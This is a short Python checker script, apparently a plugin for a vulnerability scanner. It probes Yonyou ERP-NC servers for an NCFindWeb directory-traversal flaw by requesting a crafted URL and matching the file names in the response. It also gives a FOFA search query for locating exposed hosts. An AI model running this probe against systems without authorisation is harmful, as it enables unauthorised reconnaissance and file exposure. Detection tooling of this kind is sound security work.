#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/用友OA/用友 ERP-NC NCFindWeb 目录遍历漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '用友 ERP-NC NCFindWeb 目录遍历',

      'level'     :   'medium',

      'FOFA'      :   'app="用友-UFIDA-NC"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/NCFindWeb?service=IPreAlertConfigService&filename='
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if "bottom.html" in res.text and 'Eror.jsp' in res.text and 'InstallProperties_en.properties' in res.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret